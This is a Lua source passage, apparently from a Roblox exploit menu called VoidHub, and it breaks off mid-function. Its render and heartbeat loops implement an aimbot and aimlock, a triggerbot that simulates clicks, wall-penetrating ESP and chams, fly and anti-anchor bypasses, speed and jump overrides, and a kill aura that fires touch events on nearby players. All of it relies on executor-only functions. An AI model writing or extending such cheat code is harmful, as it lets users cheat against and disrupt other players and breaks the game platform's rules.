local VH = _G.VoidHub
local Services = VH.Services
local State = VH.State
local S = State.S
local Utils = VH.Utils
local UI = VH.UI

local Players = Services.Players
local LP = Services.LP
local Mouse = Services.Mouse
local Camera = Services.Camera

local getChar = Utils.getChar
local getHRP = Utils.getHRP
local getHum = Utils.getHum
local notify = Utils.notify
local showToast = UI.showToast
local updateHUDArrayList = UI.updateHUDArrayList
local registerModule = UI.registerModule

local addToggleOption = UI.addToggleOption
local addSliderOption = UI.addSliderOption
local addDropdownOption = UI.addDropdownOption
local addKeybindOption = UI.addKeybindOption
local addTextboxOption = UI.addTextboxOption
local addButtonOption = UI.addButtonOption
local addSectionHeader = UI.addSectionHeader
local addInfoRowOption = UI.addInfoRowOption
local addCustomFrameOption = UI.addCustomFrameOption
local addScrollFeedOption = UI.addScrollFeedOption
local getOrCreateWindow = UI.getOrCreateWindow
local createFloatingWindow = UI.createFloatingWindow

local saveConfig = VH.Config.saveConfig
local loadConfig = VH.Config.loadConfig
local saveFavorites = VH.Config.saveFavorites
local loadFavorites = VH.Config.loadFavorites
local logMessage = VH.Logger.logMessage

local checkFriendship = Utils.checkFriendship
local teleportToHRP = Utils.teleportToHRP
local spectatePlayer = Utils.spectatePlayer
local resetCameraToSelf = Utils.resetCameraToSelf
local enableFreecam = Utils.enableFreecam
local disableFreecam = Utils.disableFreecam
local teleportToRandom = Utils.teleportToRandom
local teleportToLowestPop = Utils.teleportToLowestPop
local teleportToHighestPop = Utils.teleportToHighestPop
local runExternalScript = Utils.runExternalScript
local teleportToPlace = Utils.teleportToPlace

local serverStatsLabels = State.serverStatsLabels
local rowRegion = State.rowRegion
local rowPing = State.rowPing
local rowPlayers = State.rowPlayers
local rowAge = State.rowAge

local spectateStatsLabels = State.spectateStatsLabels
local specNameRow = State.specNameRow
local specHpRow = State.specHpRow
local specTeamRow = State.specTeamRow

local activeChatFeed = State.activeChatFeed
local activeConsoleFeed = State.activeConsoleFeed

local consoleLogs = State.consoleLogs
local consoleLogsMap = State.consoleLogsMap


local fovCircle = State.fovCircle
if not fovCircle then
    fovCircle = Drawing.new("Circle")
    fovCircle.Thickness = 1
    fovCircle.Color = Color3.fromRGB(218, 38, 38)
    fovCircle.Filled = false
    fovCircle.Transparency = 1
    getgenv().VoidFOVCircle = fovCircle
    State.fovCircle = fovCircle
end

local bonesR15 = {
    {"Head", "UpperTorso"}, {"UpperTorso", "LowerTorso"},
    {"UpperTorso", "LeftUpperArm"}, {"LeftUpperArm", "LeftLowerArm"}, {"LeftLowerArm", "LeftHand"},
    {"UpperTorso", "RightUpperArm"}, {"RightUpperArm", "RightLowerArm"}, {"RightLowerArm", "RightHand"},
    {"LowerTorso", "LeftUpperLeg"}, {"LeftUpperLeg", "LeftLowerLeg"}, {"LeftLowerLeg", "LeftFoot"},
    {"LowerTorso", "RightUpperLeg"}, {"RightUpperLeg", "RightLowerLeg"}, {"RightLowerLeg", "RightFoot"}
}
local bonesR6 = { {"Head", "Torso"}, {"Torso", "Left Arm"}, {"Torso", "Right Arm"}, {"Torso", "Left Leg"}, {"Torso", "Right Leg"} }


local lastTriggerFire = 0
local fpsCount = State.fpsCount
local lastFpsTick = State.lastFpsTick
local lastPingTick = State.lastPingTick
local pingVal = State.pingVal
local flingAllTarget = State.flingAllTarget
local flingAllTime = State.flingAllTime
local lastCameraYaw = State.lastCameraYaw
local lastAirVelocity = State.lastAirVelocity


local function getNextFlingAllTarget(currentTarget)
    local candidates = {}
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LP and p.Character then
            local hrp = p.Character:FindFirstChild("HumanoidRootPart") or p.Character:FindFirstChild("Torso") or p.Character.PrimaryPart
            local hum = p.Character:FindFirstChildOfClass("Humanoid")
            if hrp and hum and hum.Health > 0 then table.insert(candidates, p) end
        end
    end
    if #candidates == 0 then return nil end
    local currentIndex = 0
    if currentTarget then for idx, p in ipairs(candidates) do if p == currentTarget then currentIndex = idx; break end end end
    local nextIndex = currentIndex + 1
    if nextIndex > #candidates then nextIndex = 1 end
    return candidates[nextIndex]
end

local function getBoundingBox(char)
    return Utils.getBoundingBox(char)
end

local function getAimbotTarget()
    return Utils.getAimbotTarget()
end

local function destroyESP(p)
    return VH.Cleanup.destroyESP(p)
end

local function updateFlyVelocity()
    return Utils.updateFlyVelocity()
end

local function flyOn()
    return Utils.flyOn()
end

local function flyOff()
    return Utils.flyOff()
end

local function enableGhostMode()
    return Utils.enableGhostMode()
end

local function disableGhostMode()
    return Utils.disableGhostMode()
end

local function checkFriendship(userId)
    return Utils.checkFriendship(userId)
end

local function connectConsoleLogger()
    return VH.Logger.connectConsoleLogger()
end

local function connectChatLogger()
    return VH.Logger.connectChatLogger()
end

local function applyThemeColor(col)
    return UI.applyThemeColor(col)
end

local function toggleMapXray(v)
    return Utils.toggleMapXray(v)
end

local function toggleClearVision(v)
    return Utils.toggleClearVision(v)
end

local function toggleGraphicsReducer(v)
    return Utils.toggleGraphicsReducer(v)
end

local function setupAutoReinject()
    return Utils.setupAutoReinject()
end

local function teleportToPlace(placeId)
    return Utils.teleportToPlace(placeId)
end

local function runNetworkTagsSync()
    return VH.State.runNetworkTagsSync()
end

local networkTagsPool = State.networkTagsPool
local networkUsersHUD = State.networkUsersHUD






table.insert(S.Connections, RunService.RenderStepped:Connect(function()
    Camera = Workspace.CurrentCamera or Workspace:FindFirstChildOfClass("Camera") or Camera
    if S.ClearVision then Lighting.FogEnd = 100000 end
    fovCircle.Visible = S.AimbotActive and S.AimbotShowFOV
    if fovCircle.Visible then local vp = Camera.ViewportSize; fovCircle.Position = Vector2.new(vp.X / 2, vp.Y / 2); fovCircle.Radius = S.AimbotFOV end
    
    local aimbotPressed = false
    if S.AimbotHoldMode == "Keyboard" then if S.AimbotHoldKey and S.AimbotHoldKey ~= Enum.KeyCode.Unknown then aimbotPressed = UserInputService:IsKeyDown(S.AimbotHoldKey) end
    else aimbotPressed = UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) end

    if S.AimbotActive and aimbotPressed then
        local targetPart = getAimbotTarget()
        if targetPart then local goalCF = CFrame.new(Camera.CFrame.Position, targetPart.Position); local sm = math.max(S.AimbotSmooth, 1); Camera.CFrame = Camera.CFrame:Lerp(goalCF, 1 / sm) end
    end
    if S.AimlockActive then
        local targetPart = getAimbotTarget()
        if targetPart then local goalCF = CFrame.new(Camera.CFrame.Position, targetPart.Position); local sm = math.max(S.AimlockSmooth, 1); Camera.CFrame = Camera.CFrame:Lerp(goalCF, 1 / sm) end
    end

    pcall(function()
        if S.TriggerbotActive and not UserInputService:GetFocusedTextBox() then
            local target = Mouse.Target
            if target then
                local current = target; local char, hum = nil, nil
                while current and current ~= game do if current:IsA("Model") then local h = current:FindFirstChildOfClass("Humanoid"); if h then char = current; hum = h; break end end; current = current.Parent end
                if hum and hum.Health > 0 and char then
                    local p = Players:GetPlayerFromCharacter(char)
                    if p and p ~= LP then
                        if (not S.TriggerbotTeamCheck or p.Team ~= LP.Team) and (not S.TriggerbotIgnoreFriends or not checkFriendship(p.UserId)) then
                            local now = tick()
                            if not lastTriggerFire or (now - lastTriggerFire) >= (S.TriggerbotDelay or 0.05) then
                                lastTriggerFire = now
                                pcall(function()
                                    if mouse1press and mouse1release then task.spawn(function() mouse1press(); task.wait(0.01); mouse1release() end)
                                    elseif mouse1click then mouse1click()
                                    else VirtualUser:CaptureController(); VirtualUser:ClickButton1(Vector2.new(Mouse.X, Mouse.Y)) end
                                end)
                            end
                        end
                    end
                end
            end
        end
    end)
    
    local espColorMapping = {
        ["Red"] = Color3.fromRGB(220, 40, 40), ["Green"] = Color3.fromRGB(55, 200, 80), ["Blue"] = Color3.fromRGB(40, 120, 220),
        ["Yellow"] = Color3.fromRGB(220, 175, 45), ["Cyan"] = Color3.fromRGB(45, 200, 220), ["White"] = Color3.fromRGB(255, 255, 255)
    }
    for p, _ in pairs(S.ESPPool) do if not p or p.Parent ~= Players then destroyESP(p) end end
    for p, bill in pairs(S.OverheadPool) do if not p or p.Parent ~= Players then pcall(function() bill:Destroy() end); S.OverheadPool[p] = nil end end

    if S.Chams then
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= LP and p.Character then
                local char = p.Character
                if not char:FindFirstChild("VoidChams") then
                    local hl = Instance.new("Highlight"); hl.Name = "VoidChams"; hl.FillColor = p.Team and p.Team.TeamColor.Color or Color3.fromRGB(218, 38, 38)
                    hl.FillTransparency = 0.5; hl.OutlineColor = Color3.new(1, 1, 1); hl.Parent = char
                end
            end
        end
    else
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= LP and p.Character then local hl = p.Character:FindFirstChild("VoidChams"); if hl then hl:Destroy() end end
        end
    end

    if S.ViewModelFOV ~= 70 then
        local hum = getHum()
        if hum and hum.Health > 0 then
            local hrp = getHRP()
            if hrp and (Camera.Focus.Position - Camera.CFrame.Position).Magnitude < 1 then Camera.FieldOfView = S.ViewModelFOV
            else Camera.FieldOfView = S.CameraFOV end
        end
    end

    local espEnabled = (S.ESPBoxes or S.ESPTracers or S.ESPNames or S.ESPHealth or S.ESPDistances or S.SkeletonESP)
    if espEnabled then
        for _, p in ipairs(Players:GetPlayers()) do
            if p == LP then continue end
            local char = p.Character; local hrp = char and (char.PrimaryPart or char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso"))
            local hum = char and char:FindFirstChildOfClass("Humanoid")
            local valid = char and hrp and hum and hum.Health > 0
            if valid then
                if S.ESPTeamCheck and p.Team == LP.Team then destroyESP(p); continue end
                if S.ESPIgnoreFriends and checkFriendship(p.UserId) then destroyESP(p); continue end
                local dist = math.round((hrp.Position - Camera.CFrame.Position).Magnitude)
                local teamCol = p.Team and p.Team.TeamColor.Color or Color3.fromRGB(218, 38, 38)
                local espDrawCol = espColorMapping[S.ESPColor] or teamCol
                if S.ESPDistanceColor then local pct = math.clamp(dist / 500, 0, 1); espDrawCol = Color3.fromRGB(255 * pct, 255 * (1 - pct), 0) end

                if not S.ESPPool[p] then
                    S.ESPPool[p] = {
                        boxOutline = Drawing.new("Square"), boxFill = Drawing.new("Square"), tracer = Drawing.new("Line"),
                        nameTag = Drawing.new("Text"), healthText = Drawing.new("Text"), distText = Drawing.new("Text"),
                        healthBarOutline = Drawing.new("Square"), healthBarFill = Drawing.new("Square"), skeleton = {}
                    }
                    for i=1, 15 do table.insert(S.ESPPool[p].skeleton, Drawing.new("Line")) end
                end
                local pool = S.ESPPool[p]; local box = getBoundingBox(char); local sp, onScreen = Camera:WorldToViewportPoint(hrp.Position)

                if box and sp.Z > 0 then
                    local topLeft, bottomRight = box[1], box[2]; local width, height = bottomRight.X - topLeft.X, bottomRight.Y - topLeft.Y
                    local outline = pool.boxOutline; outline.Visible = S.ESPBoxes; outline.Position = topLeft; outline.Size = Vector2.new(width, height)
                    outline.Color = espDrawCol; outline.Thickness = 1.5; outline.Transparency = 1; outline.Filled = false
                    local fill = pool.boxFill; fill.Visible = S.ESPBoxes; fill.Position = topLeft; fill.Size = Vector2.new(width, height)
                    fill.Color = espDrawCol; fill.Transparency = 1 - S.ESPTransparency; fill.Filled = true
                    local tracer = pool.tracer; tracer.Visible = S.ESPTracers
                    local vp = Camera.ViewportSize; local originY = vp.Y
                    if S.TracerOrigin == "Center" then originY = vp.Y / 2 elseif S.TracerOrigin == "Top" then originY = 0 end
                    tracer.From = Vector2.new(vp.X / 2, originY); tracer.To = Vector2.new(sp.X, sp.Y); tracer.Color = espDrawCol; tracer.Thickness = 1.5; tracer.Transparency = 0.8
                    local hpPct = hum.Health / math.max(hum.MaxHealth, 1)
                    local healthBarOutline = pool.healthBarOutline; healthBarOutline.Visible = S.ESPHealth; healthBarOutline.Position = Vector2.new(topLeft.X - 5, topLeft.Y)
                    healthBarOutline.Size = Vector2.new(2, height); healthBarOutline.Color = Color3.new(0, 0, 0); healthBarOutline.Thickness = 1; healthBarOutline.Filled = true
                    local healthBarFill = pool.healthBarFill; healthBarFill.Visible = S.ESPHealth; healthBarFill.Position = Vector2.new(topLeft.X - 4, topLeft.Y + 1)
                    healthBarFill.Size = Vector2.new(1, (height - 2) * hpPct); healthBarFill.Color = Color3.fromRGB(255 * (1 - hpPct), 255 * hpPct, 0); healthBarFill.Filled = true
                    local nameTag = pool.nameTag; nameTag.Visible = S.ESPNames; nameTag.Text = p.DisplayName; nameTag.Size = 13; nameTag.Font = 2
                    nameTag.Center = true; nameTag.Outline = true; nameTag.Color = Color3.new(1, 1, 1); nameTag.Position = Vector2.new(topLeft.X + width / 2, topLeft.Y - 16)
                    local healthText = pool.healthText; healthText.Visible = S.ESPHealth; healthText.Text = string.format("%d HP", math.floor(hum.Health))
                    healthText.Size = 11; healthText.Font = 3; healthText.Center = true; healthText.Outline = true
                    healthText.Color = Color3.fromRGB(255 * (1 - hpPct), 255 * hpPct, 0); healthText.Position = Vector2.new(topLeft.X + width / 2, bottomRight.Y + 2)
                    local distText = pool.distText; distText.Visible = S.ESPDistances; distText.Text = string.format("%d studs", dist); distText.Size = 10; distText.Font = 3
                    distText.Center = true; distText.Outline = true; distText.Color = Color3.fromRGB(200, 200, 200); distText.Position = Vector2.new(topLeft.X + width / 2, bottomRight.Y + (S.ESPHealth and 15 or 2))
                    if S.SkeletonESP then
                        local useBones = char:FindFirstChild("UpperTorso") and bonesR15 or bonesR6
                        for i, bone in ipairs(useBones) do
                            local line = pool.skeleton[i]
                            if line then
                                local part1 = char:FindFirstChild(bone[1]); local part2 = char:FindFirstChild(bone[2])
                                if part1 and part2 then
                                    local sp1, on1 = Camera:WorldToViewportPoint(part1.Position); local sp2, on2 = Camera:WorldToViewportPoint(part2.Position)
                                    if on1 and on2 then line.Visible = true; line.From = Vector2.new(sp1.X, sp1.Y); line.To = Vector2.new(sp2.X, sp2.Y); line.Color = espDrawCol; line.Thickness = 1
                                    else line.Visible = false end
                                else line.Visible = false end
                            end
                        end
                    else for _, line in ipairs(pool.skeleton) do line.Visible = false end end
                else
                    pool.boxOutline.Visible = false; pool.boxFill.Visible = false; pool.tracer.Visible = false; pool.nameTag.Visible = false
                    pool.healthText.Visible = false; pool.distText.Visible = false; pool.healthBarOutline.Visible = false; pool.healthBarFill.Visible = false
                    for _, line in ipairs(pool.skeleton) do line.Visible = false end
                end
            else destroyESP(p) end
        end
    else
        if next(S.ESPPool) ~= nil then for p, _ in pairs(S.ESPPool) do destroyESP(p) end end
    end
end))

local fpsCount, lastFpsTick, lastPingTick, pingVal = 0, tick(), tick(), 0
local flingAllTarget, flingAllTime = nil, 0

local function getNextFlingAllTarget(currentTarget)
    local candidates = {}
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LP and p.Character then
            local hrp = p.Character:FindFirstChild("HumanoidRootPart") or p.Character:FindFirstChild("Torso") or p.Character.PrimaryPart
            local hum = p.Character:FindFirstChildOfClass("Humanoid")
            if hrp and hum and hum.Health > 0 then table.insert(candidates, p) end
        end
    end
    if #candidates == 0 then return nil end
    local currentIndex = 0
    if currentTarget then for idx, p in ipairs(candidates) do if p == currentTarget then currentIndex = idx; break end end end
    local nextIndex = currentIndex + 1
    if nextIndex > #candidates then nextIndex = 1 end
    return candidates[nextIndex]
end

local lastCameraYaw = nil
local lastAirVelocity = nil

table.insert(S.Connections, RunService.Heartbeat:Connect(function(dt)
    pcall(function()
        fpsCount = fpsCount + 1; local curT = tick(); local updated = false
        if curT - lastFpsTick >= 1 then rowHomeFPS:SetValue(tostring(fpsCount)); lastFpsTick = curT; updated = true end
        if curT - lastPingTick >= 2 then
            lastPingTick = curT
            task.spawn(function()
                local t0 = tick(); RunService.Heartbeat:Wait(); pingVal = math.max(1, math.floor((tick() - t0) * 1000))
                pcall(function()
                    rowHomePing:SetValue(pingVal .. "ms"); rowPing:SetValue(pingVal .. "ms")
                    rowPlayers:SetValue(string.format("%d / %d", #Players:GetPlayers(), Players.MaxPlayers))
                    rowAge:SetValue(string.format("%.2f hours", Workspace.DistributedGameTime / 3600))
                    Win.HUDLabel.Text = string.format("FPS: %d  |  PING: %dms", fpsCount, pingVal)
                end)
            end)
        elseif updated then Win.HUDLabel.Text = string.format("FPS: %d  |  PING: %dms", fpsCount, pingVal) end
        if S.ServerAgeHUD and hudServerAge then
            local secs = math.floor(Workspace.DistributedGameTime); local mins = math.floor(secs / 60); local hrs = math.floor(mins / 60)
            mins = mins % 60; secs = secs % 60; hudServerAge.Text = string.format("Server Age: %dh %dm %ds", hrs, mins, secs)
        end
        if S.HideNametags then
            for _, p in ipairs(Players:GetPlayers()) do
                if p ~= LP and p.Character then
                    local hum = p.Character:FindFirstChildOfClass("Humanoid")
                    if hum and hum.DisplayDistanceType ~= Enum.HumanoidDisplayDistanceType.None then hum.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None end
                end
            end
        end
        if updated then fpsCount = 0 end
    end)
    
    local myChar = getChar(); local myHRP = getHRP(); local myHum = getHum()
    
    local currentCameraCFrame = Camera.CFrame
    local _, currentYaw, _ = currentCameraCFrame:ToEulerAnglesYXZ()
    local deltaYaw = 0
    if lastCameraYaw then
        deltaYaw = currentYaw - lastCameraYaw
        if deltaYaw > math.pi then deltaYaw = deltaYaw - 2 * math.pi
        elseif deltaYaw < -math.pi then deltaYaw = deltaYaw + 2 * math.pi
        end
    end
    lastCameraYaw = currentYaw

    if S.AntiAnchor and myChar then
        pcall(function() for _, part in ipairs(myChar:GetDescendants()) do if part:IsA("BasePart") and part.Anchored then part.Anchored = false end end end)
    end
    if S.AntiSit and myHum and myHum.Sit then pcall(function() myHum.Sit = false end) end
    if S.NoRecoil and myHum then pcall(function() myHum.CameraOffset = Vector3.zero end) end
    if S.Fly then pcall(updateFlyVelocity) end

    if S.InstantRespawn and myHum and myHum.Health <= 0 then task.wait(); LP:LoadCharacter() end

    if S.FlyBypass and myHum and myHRP then
        myHum.PlatformStand = true
        if not myHRP:FindFirstChild("VoidBypassFly") then local bv = Instance.new("BodyVelocity"); bv.Name = "VoidBypassFly"; bv.MaxForce = Vector3.new(1, 1, 1) * 30000; bv.Parent = myHRP end
        local dir = Vector3.zero; local cf = Camera.CFrame
        if UserInputService:IsKeyDown(Enum.KeyCode.W) then dir = dir + cf.LookVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.S) then dir = dir - cf.LookVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.A) then dir = dir - cf.RightVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.D) then dir = dir + cf.RightVector end
        if UserInputService:IsKeyDown(Enum.KeyCode.Space) then dir = dir + Vector3.new(0, 1, 0) end
        if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then dir = dir - Vector3.new(0, 1, 0) end
        myHRP.VoidBypassFly.Velocity = (dir.Magnitude > 0 and dir.Unit * S.FlySpeed) or Vector3.zero
    elseif not S.FlyBypass and myHRP and myHRP:FindFirstChild("VoidBypassFly") then
        myHRP.VoidBypassFly:Destroy()
        if myHum then myHum.PlatformStand = false end
    end

    pcall(function()
        if S.Climb and myChar and myHRP and myHum then
            if UserInputService:IsKeyDown(Enum.KeyCode.W) then
                local rayParams = RaycastParams.new(); rayParams.FilterType = Enum.RaycastFilterType.Exclude; rayParams.FilterDescendantsInstances = {myChar}
                local result = Workspace:Raycast(myHRP.Position, myHRP.CFrame.LookVector * 3, rayParams)
                if result and result.Instance then myHum.PlatformStand = true; myHRP.CFrame = myHRP.CFrame + Vector3.new(0, S.ClimbSpeed * dt, 0); myHRP.AssemblyLinearVelocity = Vector3.zero
                else myHum.PlatformStand = false end
            else myHum.PlatformStand = false end
        end
    end)

    pcall(function()
        if S.WallRun and myChar and myHRP and myHum then
            if UserInputService:IsKeyDown(Enum.KeyCode.W) and myHum.FloorMaterial == Enum.Material.Air then
                local rayParams = RaycastParams.new(); rayParams.FilterType = Enum.RaycastFilterType.Exclude; rayParams.FilterDescendantsInstances = {myChar}
                local rightRay = Workspace:Raycast(myHRP.Position, myHRP.CFrame.RightVector * 3, rayParams)
                local leftRay = Workspace:Raycast(myHRP.Position, -myHRP.CFrame.RightVector * 3, rayParams)
                if rightRay or leftRay then local upVel = Vector3.new(0, 10, 0); local fwdVel = myHRP.CFrame.LookVector * 20; myHRP.AssemblyLinearVelocity = Vector3.new(fwdVel.X, upVel.Y, fwdVel.Z) end
            end
        end
    end)

    pcall(function()
        if myHum then
            local isSprinting = S.SprintEnabled and UserInputService:IsKeyDown(Enum.KeyCode.LeftShift)
            if isSprinting then myHum.WalkSpeed = S.SprintSpeed elseif S.ForceWalkSpeed then myHum.WalkSpeed = S.WalkSpeed end
            if S.ForceJumpPower then myHum.UseJumpPower = true; myHum.JumpPower = S.JumpPower end
        end
    end)
    
    pcall(function()
        if S.BHop and myHRP and myHum then
            local moveDir = myHum.MoveDirection
            local currentVel = myHRP.AssemblyLinearVelocity
            local horizontalVel = Vector3.new(currentVel.X, 0, currentVel.Z)
            local speed = horizontalVel.Magnitude

            if myHum.FloorMaterial ~= Enum.Material.Air then
                
                myHum:ChangeState(Enum.HumanoidStateType.Jumping)
                local targetVel = lastAirVelocity or horizontalVel
                if moveDir.Magnitude > 0.1 then
                    targetVel = targetVel + (moveDir.Unit * 4)
                end
                
                local maxSpeed = 150
                if targetVel.Magnitude > maxSpeed then
                    targetVel = targetVel.Unit * maxSpeed
                elseif targetVel.Magnitude < 16 then
                    targetVel = targetVel.Unit * 16
                end
                
                myHRP.AssemblyLinearVelocity = Vector3.new(targetVel.X, currentVel.Y, targetVel.Z)
                lastAirVelocity = nil
            else
                
                if S.BHopAutoStrafe then
                    local strafeDir = nil
                    if deltaYaw > 0.001 then 
                        strafeDir = -Camera.CFrame.RightVector
                    elseif deltaYaw < -0.001 then 
                        strafeDir = Camera.CFrame.RightVector
                    end

                    if strafeDir then
                        local strafeDirH = Vector3.new(strafeDir.X, 0, strafeDir.Z)
                        if strafeDirH.Magnitude > 0.1 then
                            strafeDirH = strafeDirH.Unit
                            local accel = 0.8
                            local newSpeed = math.clamp(speed + accel, 16, 150)
                            local blendFactor = 0.15
                            local newHorizontal = (horizontalVel.Unit * (1 - blendFactor) + strafeDirH * blendFactor).Unit * newSpeed
                            myHRP.AssemblyLinearVelocity = Vector3.new(newHorizontal.X, currentVel.Y, newHorizontal.Z)
                            lastAirVelocity = newHorizontal
                        else
                            lastAirVelocity = horizontalVel
                        end
                    else
                        
                        if moveDir.Magnitude > 0.1 then
                            local newHorizontal = (horizontalVel + moveDir.Unit * 0.5).Unit * math.clamp(speed, 16, 150)
                            myHRP.AssemblyLinearVelocity = Vector3.new(newHorizontal.X, currentVel.Y, newHorizontal.Z)
                            lastAirVelocity = newHorizontal
                        else
                            lastAirVelocity = horizontalVel
                        end
                    end
                else
                    
                    if moveDir.Magnitude > 0.1 then
                        local newHorizontal = (horizontalVel + moveDir.Unit * 0.5).Unit * math.clamp(speed, 16, 150)
                        myHRP.AssemblyLinearVelocity = Vector3.new(newHorizontal.X, currentVel.Y, newHorizontal.Z)
                        lastAirVelocity = newHorizontal
                    else
                        lastAirVelocity = horizontalVel
                    end
                end
            end
        else
            lastAirVelocity = nil
        end
    end)
    
    pcall(function()
        if S.AirWalk then
            if myHum and myHRP then
                if myHum.FloorMaterial == Enum.Material.Air then
                    if not S.AirWalkPlat then
                        local plat = Instance.new("Part"); plat.Name = "VoidAirWalkPlat"; plat.Size = Vector3.new(6, 1, 6); plat.Anchored = true; plat.CanCollide = true; plat.Transparency = 1; plat.Parent = Workspace
                        S.AirWalkPlat = plat
                    end
                    S.AirWalkPlat.CFrame = CFrame.new(myHRP.Position.X, myHRP.Position.Y - 3.5, myHRP.Position.Z)
                else
                    if S.AirWalkPlat then S.AirWalkPlat:Destroy(); S.AirWalkPlat = nil end
                end
            end
        else
            if S.AirWalkPlat then S.AirWalkPlat:Destroy(); S.AirWalkPlat = nil end
        end
    end)
    
    pcall(function()
        if S.WaterWalk and myHRP and myChar then
            if not S.WaterRaycastParams then S.WaterRaycastParams = RaycastParams.new(); S.WaterRaycastParams.FilterType = Enum.RaycastFilterType.Exclude; S.WaterRaycastParams.IgnoreWater = false end
            S.WaterRaycastParams.FilterDescendantsInstances = {myChar, S.WaterPlat}
            local raycastResult = Workspace:Raycast(myHRP.Position + Vector3.new(0, 2, 0), Vector3.new(0, -10, 0), S.WaterRaycastParams)
            if raycastResult and raycastResult.Material == Enum.Material.Water then
                if not S.WaterPlat then local plat = Instance.new("Part"); plat.Name = "VoidWaterPlat"; plat.Size = Vector3.new(100, 1, 100); plat.Anchored = true; plat.Transparency = 1; plat.CanCollide = true; plat.Parent = Workspace; S.WaterPlat = plat end
                S.WaterPlat.CFrame = CFrame.new(myHRP.Position.X, raycastResult.Position.Y - 0.5, myHRP.Position.Z)
            else
                if S.WaterPlat then S.WaterPlat:Destroy(); S.WaterPlat = nil end
            end
        else
            if S.WaterPlat then S.WaterPlat:Destroy(); S.WaterPlat = nil end
        end
    end)
    
    pcall(function()
        if S.AntiVoid and myHRP then
            if myHRP.Position.Y > S.AntiVoidY then S.LastSafePosition = myHRP.CFrame
            else
                if not S.LastAntiVoidTime or (tick() - S.LastAntiVoidTime) > 1.5 then
                    S.LastAntiVoidTime = tick(); myHRP.CFrame = S.LastSafePosition; myHRP.AssemblyLinearVelocity = Vector3.zero; notify("Anti-Void pulled you back!", Color3.fromRGB(218, 170, 42))
                end
            end
        end
    end)
    
    pcall(function()
        if S.FollowActive and S.FollowTarget then
            local tgtHRP = S.FollowTarget.Character and (S.FollowTarget.Character:FindFirstChild("HumanoidRootPart") or S.FollowTarget.Character:FindFirstChild("Torso") or S.FollowTarget.Character.PrimaryPart)
            if tgtHRP then teleportToHRP(tgtHRP) end
        end
    end)
    
    pcall(function() if S.GravityEnabled then Workspace.Gravity = S.CustomGravity end end)
    
    pcall(function()
        if S.TimeCycle then S.TimeOfDay = ((S.TimeOfDay or Lighting.ClockTime) + dt * S.TimeCycleSpeed * 0.1) % 24; Lighting.ClockTime = S.TimeOfDay
        else Lighting.ClockTime = S.TimeOfDay or Lighting.ClockTime end
    end)
    
    pcall(function() if S.Spin and myHRP then myHRP.CFrame = myHRP.CFrame * CFrame.Angles(0, math.rad(S.SpinSpeed), 0) end end)
    
    pcall(function()
        if S.AutoInteract and myHRP then
            for _, prompt in ipairs(Workspace:GetDescendants()) do
                if prompt:IsA("ProximityPrompt") and prompt.Parent and prompt.Parent:IsA("BasePart") then
                    local dist = (myHRP.Position - prompt.Parent.Position).Magnitude
                    if dist <= S.AutoInteractRadius then fireproximityprompt(prompt) end
                end
            end
        end
    end)

    pcall(function()
        if S.TouchAura and myChar and myHRP then
            local tool = myChar:FindFirstChildOfClass("Tool")
            if tool and tool:FindFirstChild("Handle") then
                for _, p in ipairs(Players:GetPlayers()) do
                    if p ~= LP and p.Character then
                        local root = p.Character:FindFirstChild("HumanoidRootPart")
                        if root and (root.Position - myHRP.Position).Magnitude <= S.KillAuraRange then
                            firetouchinterest(tool.Handle, root, 0); firetouchinterest(tool.Handle, root, 1)
                        end
                    end
                end
            end
        end
    end)
    
    pcall(function()
        if S.ToolMagnet and myHRP then
            for _, item in ipairs(Workspace:GetDescendants()) do
                if item:IsA("Tool") and item:FindFirstChild("Handle") then item.Handle.CFrame = myHRP.CFrame end
            end
        end
    end)
    
    pcall(function()
        if S.AutoJump and myHum and myHRP and myHum.FloorMaterial ~= Enum.Material.Air then
            local edgeRay = Ray.new(myHRP.Position + (myHRP.CFrame.LookVector * 2), Vector3.new(0, -5, 0))
            local hit = Workspace:FindPartOnRay(edgeRay, myChar)
            if not hit then myHum:ChangeState(Enum.HumanoidStateType.Jumping) end
        end
    end)
    
    pcall(function()
        if S.KillAura and myChar and myHRP then
            local tool = myChar:FindFirstChildOfClass("Tool")
            if tool and tool:FindFirstChild("Handle") then
                for _, p in ipairs(Players:GetPlayers()) do
                    local root = p.Character and (p.Character:FindFirstChild("HumanoidRootPart") or p.Character:FindFirstChild("Torso") or p.Character.PrimaryPart)
                    if p ~= LP and p.Character and root and p.Character:FindFirstChild("Humanoid") and p.Character.Humanoid.Health > 0 then
                        if (root.Position - myHRP.Position).Magnitude <= S.KillAuraRange then
                            firetouchinterest(tool.Handle, root, 0); firetouchinterest(tool.Handle, root, 1)
                        end
                    end
                end
            end
        end
    end)
    
    pcall(function() if S.AutoClicker and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) then VirtualUser:ClickButton1(Vector2.new()) end end)
    
    pcall(function()
        if not isFreecam and Camera.CameraType == Enum.CameraType.Watch then
            local subj = Camera.CameraSubject
            if not subj or typeof(subj) ~= "Instance" or not subj.Parent then
                Camera.CameraType = Enum.CameraType.Custom; if myHum then Camera.CameraSubject = myHum end
                specNameRow:SetValue("--"); specHpRow:SetValue("--"); specTeamRow:SetValue("--")
            else
                local targetHum = subj:IsA("Humanoid") and subj
                local targetPlayer = targetHum and Players:GetPlayerFromCharacter(targetHum.Parent)
                if targetPlayer and targetHum then
                    local teamCol = targetPlayer.Team and targetPlayer.Team.TeamColor.Color or Color3.fromRGB(200, 200, 200)
                    specNameRow:SetValue(targetPlayer.DisplayName); specNameRow:SetColor(teamCol)
                    specHpRow:SetValue(string.format("%d HP / %d", math.floor(targetHum.Health), math.floor(targetHum.MaxHealth)))
                    specTeamRow:SetValue(targetPlayer.Team and targetPlayer.Team.Name or "Neutral")
                end
            end
        end
    end)
    
    pcall(function() if S.HUDCoords and myHRP then local pos = myHRP.Position; hudCoords.Text = string.format("XYZ: %.1f, %.1f, %.1f", pos.X, pos.Y, pos.Z) end end)
    
    pcall(function()
        if S.AntiFling then
            if myHRP and not S.FlingActive and not S.FlingAllActive then
                if myHRP.AssemblyLinearVelocity.Magnitude > 1000 then myHRP.AssemblyLinearVelocity = Vector3.zero end
